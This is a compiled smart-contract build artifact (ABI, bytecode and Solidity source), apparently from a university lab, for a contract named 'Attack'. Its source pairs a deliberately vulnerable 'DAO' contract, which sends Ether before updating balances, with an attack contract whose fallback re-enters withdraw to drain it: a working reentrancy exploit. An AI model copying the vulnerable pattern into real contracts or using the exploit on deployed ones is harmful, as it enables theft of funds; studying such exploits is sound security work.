{
  "contractName": "Attack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "dao",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "addr",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "addBalance",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260018060146101000a81548160ff02191690831515021790555034801561002a57600080fd5b506040516020806106218339810180604052810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610543806100de6000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633ccfd60b146101f75780634162169f1461020e578063b163cc3814610265575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561015057600080fd5b505af1158015610164573d6000803e3d6000fd5b505050506040513d602081101561017a57600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101dd57600080fd5b505af11580156101f1573d6000803e3d6000fd5b50505050005b34801561020357600080fd5b5061020c61027c565b005b34801561021a57600080fd5b5061022361041c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561027157600080fd5b5061027a610441565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561037557600080fd5b505af1158015610389573d6000803e3d6000fd5b505050506040513d602081101561039f57600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561040257600080fd5b505af1158015610416573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b5cef24a306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156104fd57600080fd5b505af1158015610511573d6000803e3d6000fd5b505050505600a165627a7a7230582058c089317251120397cddda97fbf92b34bdf3fd89d17c1f5c8228b78a3725af90029",
  "source": "pragma solidity ^0.4.2;\n\ncontract DAO {   \n  mapping (address => uint) public balance;\n    \n  function addBalance(address to) payable {\n    balance[to] += msg.value;\n  }\n    \n  function withdraw(uint amount) {\n    if (balance[msg.sender]>= amount) {\n      bool res = msg.sender.call.value(amount)();\n      balance[msg.sender]-=amount;\n    }\n  }  \n\n  function getBalance(address to) returns (uint){\n    return balance[to];\n  }\n}\n\ncontract Attack {\n  DAO public dao;\n  address owner;\n  bool isAttack = true;\n\n  function Attack(DAO addr){ \n    owner = msg.sender;\n    dao = addr;\n  }\n\n  function() payable { \n    dao.withdraw(dao.getBalance(this)); \n  }\n\n  function addBalance() {\n      dao.addBalance(this);\n  }\n  \n  function withdraw() {\n      dao.withdraw(dao.getBalance(this));\n  }\n}",
  "sourcePath": "/Users/liubowen/sutd/SCticket/code/contracts/DAO.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "2.0.2",
  "updatedAt": "2020-11-17T03:42:54.933Z"
}